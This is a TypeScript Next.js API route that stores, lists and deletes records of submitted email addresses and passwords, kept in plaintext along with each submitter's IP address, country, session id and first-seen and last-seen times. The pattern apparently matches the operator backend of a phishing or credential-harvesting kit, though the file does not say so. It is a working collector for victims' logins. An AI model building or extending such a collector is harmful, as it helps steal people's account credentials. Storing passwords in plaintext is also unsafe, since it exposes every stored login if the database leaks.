// app/api/credentials/route.ts
import { NextResponse } from "next/server";
import { mainDb } from "@/lib/db";
import { clients, credentials } from "@/lib/schema/main.schema";
import { eq, and, desc } from "drizzle-orm";
import { requireRouteSession } from "@/lib/auth";

export async function GET() {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    const rows = mainDb
      .select()
      .from(credentials)
      .orderBy(desc(credentials.timestamp))
      .all();

    return NextResponse.json({ success: true, credentials: rows });
  } catch (error: any) {
    console.error("Credentials GET Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}

export async function POST(request: Request) {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    const body = await request.json();
    const { sessionId, client_ip, email, password, country } = body;

    if (!sessionId || !client_ip || !email || !password) {
      return NextResponse.json(
        {
          success: false,
          error: "Missing required fields (sessionId, client_ip, email, password)",
        },
        { status: 400 }
      );
    }

    const now = new Date().toISOString();

    mainDb.transaction((tx) => {
      // Upsert client record
      tx.insert(clients)
        .values({ sessionId, client_ip, first_seen: now, last_seen: now })
        .onConflictDoUpdate({
          target: clients.sessionId,
          set: { client_ip, last_seen: now },
        })
        .run();

      // Insert credential
      tx.insert(credentials)
        .values({
          sessionId,
          timestamp: now,
          email,
          password,
          country: country || "Unknown",
        })
        .run();
    });

    return NextResponse.json({
      success: true,
      message: "Credentials stored successfully",
    });
  } catch (error: any) {
    console.error("Credentials POST Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}

export async function DELETE(request: Request) {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    const { searchParams } = new URL(request.url);
    const sessionId = searchParams.get("sessionId");
    const timestamp = searchParams.get("timestamp");

    if (!sessionId || !timestamp) {
      return NextResponse.json(
        { success: false, error: "Missing sessionId or timestamp parameters" },
        { status: 400 }
      );
    }

    mainDb
      .delete(credentials)
      .where(
        and(
          eq(credentials.sessionId, sessionId),
          eq(credentials.timestamp, timestamp)
        )
      )
      .run();

    return NextResponse.json({
      success: true,
      message: "Credential record deleted",
    });
  } catch (error: any) {
    console.error("Credentials DELETE Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}
